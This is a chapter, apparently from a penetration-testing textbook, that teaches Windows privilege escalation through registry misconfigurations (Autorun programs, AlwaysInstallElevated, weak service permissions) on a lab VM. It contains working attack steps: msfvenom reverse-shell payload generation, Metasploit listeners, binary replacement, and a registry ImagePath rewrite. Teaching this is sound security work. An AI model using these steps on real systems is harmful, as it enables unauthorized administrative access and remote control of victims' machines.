<html><head></head><body><div id="sbo-rt-content"><div id="_idContainer250">
			<h1 id="_idParaDest-121"><em class="italic"><a id="_idTextAnchor126"/>Chapter 9</em>: Privilege Escalation through the Windows Registry</h1>
			<p>You should now have a good grasp of how to identify and perform some of the most important privilege escalation techniques on Windows. However, one final piece of this puzzle remains: the Windows Registry. In this chapter, we will look at how to elevate privileges on the target system by leveraging misconfigurations and weaknesses in the Windows Registry.</p>
			<p>We will explore the process of identifying misconfigurations in the registry, utilizing the Autorun functionality, exploiting weak registry permissions, and the AlwaysInstallElevated feature to elevate our privileges. We will also provide a brief overview of the Windows Registry to understand its purpose and functionality.</p>
			<p>In this chapter, we're going to cover the following main topics:</p>
			<ul>
				<li>Understanding the Windows Registry</li>
				<li>Exploiting Autorun programs</li>
				<li>Exploiting the AlwaysInstallElevated feature</li>
				<li>Exploiting weak registry permissions</li>
			</ul>
			<h1 id="_idParaDest-122"><a id="_idTextAnchor127"/>Technical requirements </h1>
			<p>To follow along with the demonstrations in this chapter, you will need to ensure that you meet the following technical requirements:</p>
			<ul>
				<li>Familiarity with Windows CMD commands</li>
				<li>Familiarity with the Windows Registry</li>
			</ul>
			<p>You can view this chapter's code in action here: <a href="https://bit.ly/3oga2ji">https://bit.ly/3oga2ji</a></p>
			<h1 id="_idParaDest-123"><a id="_idTextAnchor128"/>Understanding the Windows Registry</h1>
			<p>Before we can<a id="_idIndexMarker517"/> dig into the meat and potatoes of this chapter, we must have a functional understanding of the Windows Registry, what it is used for, and how it works.</p>
			<p>This information will prove useful in the latter sections of this chapter and will provide a much better context of what we are doing, as well as what we want to achieve, when we utilize various privilege escalation techniques.</p>
			<h2 id="_idParaDest-124"><a id="_idTextAnchor129"/>What is the Windows Registry?</h2>
			<p>Simply put, the<a id="_idIndexMarker518"/> Windows Registry is a hierarchical database that is responsible for storing configurations, settings, and values for applications, hardware, and the Windows operating system. In the context of programs and applications, the registry is also used to store program and application data relevant to the configuration and operation of the program.</p>
			<p>Given the centralized nature of the Windows Registry and the data it stores, it is a prime target for penetration testers during the privilege escalation process. This is because it can reveal information about the operating system's configuration and the configuration of the programs that have been installed on the target system. These configurations can reveal potential weaknesses in various Windows services, such as the Autorun feature.</p>
			<p>In <a href="B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058"><em class="italic">Chapter 4</em></a>, <em class="italic">Performing Local Enumeration</em>, we explored various enumeration techniques that can be used to exfiltrate important and useful data from the registry primarily pertaining to application passwords. However, we did not explore the process of enumerating important operating system configurations that can be used to exploit services and other Windows features.</p>
			<p>In this chapter, we will be exploring the process of identifying these operating system misconfigurations in the Windows Registry and how they can be leveraged to elevate our privileges.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">Note that programs and applications are not required to store configurations in the Windows Registry and may opt to store them within the program installation directory. You must keep this in mind when searching for misconfigurations and vulnerabilities in programs and applications.</p>
			<p>We can access the Windows Registry on a Windows system by running the <strong class="source-inline">regedit.exe</strong> executable. This can be done through the Windows Command Prompt or the <strong class="bold">Run</strong> utility, as highlighted in the following screenshot:</p>
			<div>
				<div id="_idContainer230" class="IMG---Figure">
					<img src="Images/B17389_09_001.jpg" alt="Figure 9.1 – Launching regedit.exe&#13;&#10;" width="394" height="203"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.1 – Launching regedit.exe</p>
			<p class="callout-heading">Note</p>
			<p class="callout">The Windows Registry <a id="_idIndexMarker519"/>Editor (<strong class="source-inline">regedit.exe</strong>), is a built-in Windows executable that is used to interact with the Windows Registry and allows users to view and edit registry entries.</p>
			<p>As shown in the following screenshot, the Windows Registry uses a hierarchical sorting system that categorizes data as keys and values based on its functionality and purpose:</p>
			<div>
				<div id="_idContainer231" class="IMG---Figure">
					<img src="Images/B17389_09_002.jpg" alt="Figure 9.2 – Registry Editor&#13;&#10;" width="648" height="236"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.2 – Registry Editor</p>
			<p>The Windows Registry Editor displays various keys that contain their respective values. Now, let's<a id="_idIndexMarker520"/> take a look at how these keys and values are stored and categorized.</p>
			<h2 id="_idParaDest-125"><a id="_idTextAnchor130"/>How the Windows Registry stores data</h2>
			<p>The Windows <a id="_idIndexMarker521"/>Registry operates under a key/value system, where entries store their data in the form of a key and data pair.</p>
			<p>To understand how keys and values work in the context of the Windows Registry, we can use the categorization analogy of folders and files, where keys are folders and values are files.</p>
			<p>The Windows Registry Editor displays a categorized list of root keys that contain all the registry values on the system. The following table provides a description of each root key, its abbreviation, and the nature of the respective values it stores:</p>
			<div>
				<div id="_idContainer232" class="IMG---Figure">
					<img src="Images/B17389_09_table_01.jpg" alt="" width="1592" height="661"/>
				</div>
			</div>
			<p>Now that you understand how the Windows Registry stores data, the various root keys, and the type of information they store, we can begin exploring the process of identifying operating misconfigurations in the Windows Registry.</p>
			<p>This process is dynamic and, as a result, will depend on the target configuration and deployment use case, primarily because the techniques involved in this process will depend on the implementation and configuration of particular services.</p>
			<p>Given the robust nature of this process and the techniques used, we will be utilizing the Windows 7 virtual machine that we configured in <a href="B17389_08_Final_PG_ePub.xhtml#_idTextAnchor114"><em class="italic">Chapter 8</em></a>, <em class="italic">Exploiting Services</em>. This has been configured with vulnerable services and configurations.</p>
			<p>Before we begin, ensure that you have a foothold on the target system and have access to it through a command shell or Meterpreter session.</p>
			<p>The techniques<a id="_idIndexMarker522"/> and tools used in this chapter will involve utilizing native Windows commands and specific Meterpreter modules to automate various aspects of the process.</p>
			<p>We will begin by looking at how to identify and exploit Autorun programs in order to elevate our privileges.</p>
			<h1 id="_idParaDest-126"><a id="_idTextAnchor131"/>Exploiting Autorun programs</h1>
			<p>Autorun is a <a id="_idIndexMarker523"/>Windows feature that is used to automatically start applications and programs during system startup.</p>
			<p>Autorun is a companion feature to AutoPlay that is typically used to automate the startup of setup files for specific programs. This helps streamline the installation of new software when the installation media is inserted into the system. </p>
			<p>Programs and software can be configured to run on system startup with the Autorun feature.</p>
			<p>The Autorun feature is disabled by default in newer versions of Windows such as Windows 10; however, Microsoft has provided users with the ability to enable it. This technique will require the Autorun feature to be enabled on the target.</p>
			<p>We can elevate our privileges through Autorun by identifying programs that have been configured to run on system startup, as well as those that can be run by users with administrative privileges. We can then use these to elevate our privileges.</p>
			<p>This process can be performed completing the following steps:</p>
			<ol>
				<li>The first step in this process involves identifying Autorun applications on the target system. This can be done by running the following command in the Windows command shell:<p class="source-code"><strong class="bold">reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</strong></p><p>As highlighted<a id="_idIndexMarker524"/> in the following screenshot, this will display a list of Autorun applications:</p><div id="_idContainer233" class="IMG---Figure"><img src="Images/B17389_09_003.jpg" alt="Figure 9.3 – Windows Registry Autorun programs&#13;&#10;" width="1053" height="205"/></div><p class="figure-caption">Figure 9.3 – Windows Registry Autorun programs</p></li>
				<li>We can also identify applications that have been configured for Autorun and their respective permissions by using the <strong class="source-inline">accesschk</strong> utility. The <strong class="source-inline">accesschk</strong> executable can be downloaded from here: <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a>.<p>After downloading the <strong class="source-inline">accesschk</strong> executable to our Kali virtual machine, we will need to transfer it to the target system. This can be done through Meterpreter by running the following command:</p><p class="source-code"><strong class="bold">upload /&lt;PATH-TO-EXECUTABLE/accesschk64.exe</strong></p><p>If you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p><p>After uploading the <strong class="source-inline">accesschk.exe</strong> binary to the target system, we can enumerate a list of all Autoruns programs by running the following command in the Windows command shell:</p><p class="source-code"><strong class="bold">.\accesschk64.exe -wvu "c:\Program Files\ Autorun Program"</strong></p><p>As highlighted in the following screenshot, this will highlight a list of Autorun programs, their access permissions, and their respective directories:</p><p class="callout-heading">Note</p><p class="callout"><strong class="source-inline">RW</strong> indicates that the groups have read and write permissions and, as a result, can make changes to the contents of the program directory.</p><div id="_idContainer234" class="IMG---Figure"><img src="Images/B17389_09_004.jpg" alt="Figure 9.4 – accesschk Autorun programs" width="796" height="346"/></div><p class="figure-caption">Figure 9.4 – accesschk Autorun programs</p><p>As highlighted<a id="_idIndexMarker525"/> in the preceding screenshot, we identified the <strong class="source-inline">program.exe</strong> exactable and its permissions. In this case, the executable has <strong class="source-inline">NT AUTHORITY \SYSTEM</strong> access permissions. We can utilize this program to elevate our privileges by replacing the program executable with a Meterpreter shell executable that will be automatically executed when the administrator logs in, providing us with an elevated Meterpreter session.</p><p>The next step will involve generating the reverse shell executable and uploading it to the target system.</p><p class="callout-heading">Note</p><p class="callout">This privilege escalation technique requires the administrator to log on to the system for the Autorun program to be executed.</p></li>
				<li>We can generate the Meterpreter payload with <strong class="source-inline">msfvenom</strong> and save it as an executable. This can be done by running the following command in Kali:<p class="source-code"><strong class="bold">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;LISTENER-IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; /home/kali/Desktop/program.exe</strong></p><p class="callout-heading">Note</p><p class="callout">The reverse shell payload should have the same name of the program we are trying to exploit, and it should be uploaded to the respective service path we identified earlier and highlighted <a id="_idIndexMarker526"/>here.</p></li>
				<li>After generating the payload, we can upload it to the target Autorun application path, which is as follows:<p class="source-code">C:\Program Files\Autorun Program\</p></li>
				<li>Before we can upload the Meterpreter payload, we need to rename the original binary. However, it is recommended to take a backup of the original binary in the event the process does not work as expected. The original executable can be renamed by running the following command in the Meterpreter session:<p class="source-code"><strong class="bold">mv program.exe program_backup.exe</strong></p></li>
				<li>Now, we can upload the Meterpreter executable to the target Autorun program directory on the target using Meterpreter by running the following command:<p class="source-code"><strong class="bold">upload /home/kali/Desktop/program.exe</strong></p><p>If you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p><p>As highlighted in the following screenshot, this will upload the Meterpreter executable to the <strong class="source-inline">Autorun Program</strong> directory:</p><div id="_idContainer235" class="IMG---Figure"><img src="Images/B17389_09_005.jpg" alt="Figure 9.5 – Uploading a custom Autorun program&#13;&#10;" width="901" height="159"/></div><p class="figure-caption">Figure 9.5 – Uploading a custom Autorun program</p></li>
				<li>Now, we need to set up the Meterpreter listener with Metasploit. This can be done by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use /exploit/multi/handler</strong></p></li>
				<li>The next step involves specifying the payload we used to create the binary with MSFvenom. This can be done by running the following command:<p class="source-code"><strong class="bold">set payload /windows/x64/meterpreter/reverse_tcp</strong></p><p>Now, we<a id="_idIndexMarker527"/> need to configure the module options. In this case, we need to configure the <strong class="source-inline">LHOST</strong> and <strong class="source-inline">LPORT</strong> options, as highlighted in the following screenshot:</p><div id="_idContainer236" class="IMG---Figure"><img src="Images/B17389_09_006.jpg" alt="Figure 9.6 – Meterpreter payload options&#13;&#10;" width="1011" height="314"/></div><p class="figure-caption">Figure 9.6 – Meterpreter payload options</p></li>
				<li>After setting the module options, we can start the listener by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>The listener will listen for any incoming connections from the payload we generated with MSFvenom.</p></li>
				<li>Our custom Autorun program will be executed automatically the next time the administrator logs in, after which we should receive a privileged Meterpreter session, as highlighted in the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer237" class="IMG---Figure">
					<img src="Images/B17389_09_007.jpg" alt="Figure 9.7 – Autorun Meterpreter session&#13;&#10;" width="1019" height="204"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.7 – Autorun Meterpreter session</p>
			<p>With that, we <a id="_idIndexMarker528"/>have successfully elevated our privileges by leveraging an Autorun program with misconfigured permissions.</p>
			<h1 id="_idParaDest-127"><a id="_idTextAnchor132"/>Exploiting the Always Install Elevated feature</h1>
			<p>AlwaysInstallElevated is a Windows feature that allows standard user accounts with no administrative privileges to install software packaged in the <strong class="bold">Microsoft Windows Installer</strong> (<strong class="bold">MSI</strong>) format <a id="_idIndexMarker529"/>with administrative privileges. </p>
			<p>We can leverage this configuration to elevate our privileges by generating a custom executable with the MSI format. Then, we can utilize the <strong class="source-inline">msiexec</strong> utility to execute the MSI executable, which will give us an elevated session.</p>
			<p>This feature is commonly misconfigured in companies and organizations, primarily for ease of access for employees or is mistakenly left enabled by administrators after setting up a workstation. Either way, this technique will allow us to elevate our privileges in a relatively straightforward manner.</p>
			<p>The Always Install Elevated feature is configured in the Windows Registry and as a result, we can query the registry to determine whether the feature is enabled before we begin the privilege escalation process.</p>
			<p>Let's look at how to perform this technique both manually and automatically with the Metasploit framework. </p>
			<p class="callout-heading">Note</p>
			<p class="callout">If this feature is not enabled on the target system, this technique will not work.</p>
			<p>To perform this technique, follow these steps:</p>
			<ol>
				<li value="1">The first step involves identifying whether the AlwaysInstallElevated feature is enabled on the target system. This can be done by running the following registry queries in<a id="_idIndexMarker530"/> the Windows command shell:<p class="source-code"><strong class="bold">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</strong></p><p class="source-code"><strong class="bold">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</strong></p><p>As highlighted in the following screenshot, this will output the registry configuration for the AlwaysInstallElevated feature and its value. If the highlighted value in the following screenshot is set to <strong class="source-inline">0</strong>, the feature is disabled, while if the value is set to <strong class="source-inline">1</strong>, the feature is enabled:</p><div id="_idContainer238" class="IMG---Figure"><img src="Images/B17389_09_008.jpg" alt="Figure 9.8 – Registry query – AlwaysInstallElevated&#13;&#10;" width="911" height="184"/></div><p class="figure-caption">Figure 9.8 – Registry query – AlwaysInstallElevated</p><p>In this case, we determined that the AlwaysInstallElevated feature is enabled and can therefore be leveraged to elevate our privileg<a id="_idTextAnchor133"/>es.</p></li>
				<li>The second step in the process will involve generating the custom MSI executable with MSFvenom. This can be done by running the following command in Kali:<p class="source-code"><strong class="bold">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI-IP&gt; LPORT=&lt;PORT&gt; -f msi &gt; setup.msi</strong></p></li>
				<li>After generating the payload, we can upload it to the Windows temporary directory, which can be found here:<p class="source-code">C:\Temp</p><p>Now, we<a id="_idIndexMarker531"/> can upload the custom MSI executable to the temporary directory on the target using Meterpreter by running the following command:</p><p class="source-code"><strong class="bold">upload /home/kali/Desktop/setup<a id="_idTextAnchor134"/>.msi</strong></p><p>If you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p><p>As shown in the following screenshot, this will upload the Meterpreter executable to the <strong class="source-inline">Autorun Program</strong> directory:</p><div id="_idContainer239" class="IMG---Figure"><img src="Images/B17389_09_009.jpg" alt="Figure 9.9 – Meterpreter – upload custom MSI&#13;&#10;" width="909" height="159"/></div><p class="figure-caption">Figure 9.9 – Meterpreter – upload custom <a id="_idTextAnchor135"/>MSI</p></li>
				<li>Now, we need to set up the Meterpreter listener with Metasploit. This can be done by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use /exploit/multi/handler</strong></p></li>
				<li>The next step involves specifying the payload we used to create the custom MSI executable with MSFvenom. This can be done by running the following command:<p class="source-code"><strong class="bold">set payload /windows/x64/meterpreter/reverse_tcp</strong></p><p>Now, we need to configure the module options. In this case, we need to configure the <strong class="source-inline">LHOST</strong> and <strong class="source-inline">LPORT</strong> options, as highlighted in the following screenshot:</p><div id="_idContainer240" class="IMG---Figure"><img src="Images/B17389_09_010.jpg" alt="Figure 9.10 – Meterpreter payload options&#13;&#10;" width="994" height="314"/></div><p class="figure-caption">Figure 9.10 – Meterpreter payload options</p><p>After setting <a id="_idIndexMarker532"/>the module options, we can start the listener by running the following command:</p><p class="source-code"><strong class="bold">run</strong></p><p>The listener will listen for any incoming connections from the custom MSI executable we generated with <strong class="bold">MSFvenom</strong>.</p></li>
				<li>The next step involves executing the custom MSI executable with the <strong class="source-inline">msiexec</strong> utility. This can be done by running the following command in the Windows command shell:<p class="source-code"><strong class="bold">msiexec /quiet /qn /i C:/temp/setup.msi </strong></p><p>If successful, this will spawn an elevated Meterpreter session on our listener, as highlighted in the following screenshot:</p><div id="_idContainer241" class="IMG---Figure"><img src="Images/B17389_09_011.jpg" alt="Figure 9.11 – AlwaysInstallElevated Meterpreter session&#13;&#10;" width="969" height="209"/></div><p class="figure-caption">Figure 9.11 – AlwaysInstallElevated Meterpreter session</p></li>
				<li>This process will also add the current standard user to the local administrators' group. We can confirm this by running the following command in the Windows command shell:<p class="source-code"><strong class="bold">net localgroup administrators</strong></p><p>As highlighted in the following screenshot, the <strong class="source-inline">Win7</strong> user has been added to the local administrators' group and has administrative privileges:</p></li>
			</ol>
			<div>
				<div id="_idContainer242" class="IMG---Figure">
					<img src="Images/B17389_09_012.jpg" alt="Figure 9.12 – Local administrators group members&#13;&#10;" width="911" height="253"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.12 – Local administrators group members</p>
			<p>With that, we<a id="_idIndexMarker533"/> successfully elevated our privileges by leveraging the AlwaysInstallElevated feature manually.</p>
			<p>We can also automate the process by using a Metasploit module:</p>
			<ol>
				<li value="1">Load the module by running the following command:<p class="source-code"><strong class="bold">use exploit/windows/local/always_install_elevated</strong></p></li>
				<li>After loading the module, you will need to set the <strong class="source-inline">SESSION</strong> option for the module. The <strong class="source-inline">SESSION</strong> option requires the session ID of your Meterpreter session. This can be done by running the following command:<p class="source-code"><strong class="bold">set SESSION &lt;SESSION-ID&gt;</strong></p><p>As illustrated in the following screenshot, the <strong class="source-inline">SESSION</strong> option should reflect the session ID you set:</p><div id="_idContainer243" class="IMG---Figure"><img src="Images/B17389_09_013.jpg" alt="Figure 9.13 – Metasploit module options&#13;&#10;" width="952" height="315"/></div><p class="figure-caption">Figure 9.13 – Metasploit module options</p></li>
				<li>After configuring the module options, we can run the module by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>If the<a id="_idIndexMarker534"/> exploit is successful, you should get a new elevated Meterpreter session, as highlighted in following screenshot:</p></li>
			</ol>
			<div>
				<div id="_idContainer244" class="IMG---Figure">
					<img src="Images/B17389_09_014.jpg" alt="Figure 9.14 – Elevated Meterpreter session&#13;&#10;" width="964" height="246"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.14 – Elevated Meterpreter session</p>
			<p>With that, we successfully elevated our privileges by leveraging the AlwaysInstallElevated feature on Windows both manually and automatically with Metasploit. </p>
			<h1 id="_idParaDest-128"><a id="_idTextAnchor136"/>Exploiting weak registry permissions</h1>
			<p>This privilege <a id="_idIndexMarker535"/>escalation technique involves identifying and modifying the registry values of a service with a standard user account. In many cases, writing or modifying values in the Windows Registry is limited to administrators. However, you may come across services that can be modified by standard user accounts.</p>
			<p>We can leverage this vulnerability to modify the <strong class="bold">ImagePath</strong> (the application path) of a service with the path of a custom executable. This will give us an elevated session when the service is restarted. </p>
			<p>This technique will only work on systems that have at least one or more services with weak permissions.</p>
			<p>The exploitation process can be performed by following these steps:</p>
			<ol>
				<li value="1">The first step in this process involves identifying a list of services whose registry values <a id="_idIndexMarker536"/>can be modified. In this case, we can<a id="_idIndexMarker537"/> use the <strong class="bold">winPEAS</strong> enumeration tool to enumerate a list of services with registry values and their respective permissions.<p>The winPEAS<a id="_idIndexMarker538"/> binary can be downloaded from the following GitHub repository: <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe</a>.</p><p>Ensure you download the correct binary based on the architecture of your target operating system; the architecture-specific binaries can be found in the <strong class="source-inline">binaries</strong> folder, as highlighted in the following screenshot:</p><div id="_idContainer245" class="IMG---Figure"><img src="Images/B17389_09_015.jpg" alt="Figure 9.15 – winPEAS binaries&#13;&#10;" width="880" height="350"/></div><p class="figure-caption">Figure 9.15 – winPEAS binaries</p><p>After downloading the binary to our Kali VM, we need to transfer the <strong class="source-inline">winPEAS.exe</strong> binary to our target virtual machine. </p></li>
				<li>We can transfer the <strong class="source-inline">winPEAS.exe</strong> binary to the target system with Meterpreter by running the following command:<p class="source-code"><strong class="bold">upload /&lt;PATH-To-BINARY&gt;/winPEASx64.exe</strong></p><p>If you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p></li>
				<li>After uploading the <strong class="source-inline">winPEAS.exe</strong> binary to the target system, you can enumerate<a id="_idIndexMarker539"/> a list of service registry values by running the following command:<p class="source-code"><strong class="bold">.\winPEASx64.exe servicesinfo</strong></p><p>As shown in the following screenshot, this will enumerate a list of service registry values that can be modified. In our case, we can identify the <strong class="source-inline">regsvc</strong> service, which has the required permissions:</p><div id="_idContainer246" class="IMG---Figure"><img src="Images/B17389_09_016.jpg" alt="Figure 9.16 – winPEAS insecure registry service&#13;&#10;" width="1347" height="131"/></div><p class="figure-caption">Figure 9.16 – winPEAS insecure registry service</p><p>In this case, we can modify the service and modify the <strong class="source-inline">ImagePath</strong> with the path to our own Meterpreter executable.</p></li>
				<li>The second step in the process will involve generating the custom Meterpreter executable with <strong class="bold">MSFvenom</strong>. This can be done by running the following command in Kali:<p class="source-code"><strong class="bold">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;KALI-IP&gt; LPORT=&lt;PORT&gt; -f exe &gt; shell.exe</strong></p></li>
				<li>After generating the executable, we can upload it to the Windows temporary directory, which can be found here:<p class="source-code">C:\Temp</p></li>
				<li>Now, we can upload the custom executable to the temporary directory on the target using Meterpreter by running the following command:<p class="source-code"><strong class="bold">upload /home/kali/Desktop/shell.exe</strong></p><p>If you are using a standard command shell, you can use the <strong class="source-inline">certutil</strong> utility to transfer the binary to the target system.</p><p>As shown in the following screenshot, this will upload the Meterpreter executable<a id="_idIndexMarker540"/> to the temporary directory:</p><div id="_idContainer247" class="IMG---Figure"><img src="Images/B17389_09_017.jpg" alt="Figure 9.17 – Meterpreter – upload custom executable&#13;&#10;" width="825" height="163"/></div><p class="figure-caption">Figure 9.17 – Meterpreter – upload custom executable</p></li>
				<li>Now, we need to set up the Meterpreter listener with Metasploit. This can be done by running the following command in the Metasploit console:<p class="source-code"><strong class="bold">use /exploit/multi/handler</strong></p></li>
				<li>The next step involves specifying the payload we used to create the custom executable with <strong class="bold">MSFvenom</strong>. This can be done by running the following command:<p class="source-code"><strong class="bold">set payload /windows/x64/meterpreter/reverse_tcp</strong></p><p>Now, we need to configure the module options. In this case, we need to configure the <strong class="source-inline">LHOST</strong> and <strong class="source-inline">LPORT</strong> options, as highlighted in the following screenshot:</p><div id="_idContainer248" class="IMG---Figure"><img src="Images/B17389_09_018.jpg" alt="Figure 9.18 – Meterpreter payload options&#13;&#10;" width="948" height="314"/></div><p class="figure-caption">Figure 9.18 – Meterpreter payload options</p></li>
				<li>After setting the module options, we can start the listener by running the following command:<p class="source-code"><strong class="bold">run</strong></p><p>The listener will listen for any incoming connections from the custom executable we generated with <strong class="bold">MSFvenom</strong>.</p></li>
				<li>Now, we can modify the <strong class="source-inline">ImagePath</strong> value for the target registry service and set it as the<a id="_idIndexMarker541"/> path of the custom executable we generated. This can be done by running the following command in the Windows command shell on the target:<p class="source-code"><strong class="bold">reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\regsvc" /t REG_EXPAND_SZ /v ImagePath /d "C:\Temp\shell.exe" /f</strong></p><p>If successful, the new value should be written. Now the service will execute our custom executable the next time it is started or restarted.</p></li>
				<li>We can start the service by running the following command in the Windows command shell:<p class="source-code"><strong class="bold">sc start regsvc</strong></p></li>
				<li>The service will now execute our custom executable and provide us with an elevated Meterpreter session on the listener we set up, as highlighted in the following screenshot:</li>
			</ol>
			<div>
				<div id="_idContainer249" class="IMG---Figure">
					<img src="Images/B17389_09_019.jpg" alt="Figure 9.19 – Elevated Meterpreter session&#13;&#10;" width="962" height="175"/>
				</div>
			</div>
			<p class="figure-caption">Figure 9.19 – Elevated Meterpreter session</p>
			<p>You should now <a id="_idIndexMarker542"/>have a good grasp of how to identify misconfigurations in the Windows Registry, as well as how to leverage them to elevate your privileges on a target system.</p>
			<h1 id="_idParaDest-129"><a id="_idTextAnchor137"/>Summary</h1>
			<p>In this chapter, we understood how the Windows Registry works and how it stores data. Then, we explored the process of identifying and exploiting the Autorun feature on Windows to elevate our privileges. We also explored the process of leveraging the AlwaysInstallElevated feature on Windows to elevate our privileges, both manually and automatically, with Metasploit. Finally, we looked at how to exploit weak registry service permissions.</p>
			<p>In the next chapter, we will begin the privilege escalation process on Linux by exploring the process of identifying and utilizing kernel exploits.</p>
		</div>
	</div></body></html>